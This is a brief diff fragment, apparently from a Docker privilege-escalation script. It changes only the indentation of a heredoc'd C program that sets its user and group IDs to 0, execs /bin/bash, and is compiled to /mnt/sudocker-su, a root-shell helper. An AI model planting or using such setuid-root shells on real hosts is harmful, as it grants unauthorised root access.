@@ -47,8 +47,8 @@ int main() {
 	char *argv[]={\"/bin/bash\",NULL};
 	setuid(0);
 	setgid(0);
-    execvp(\"/bin/bash\",argv);
-    return 0;
+	execvp(\"/bin/bash\",argv);
+	return 0;
 }
 SUDOCKER-SU
 gcc sudocker-su.c -o /mnt/sudocker-su
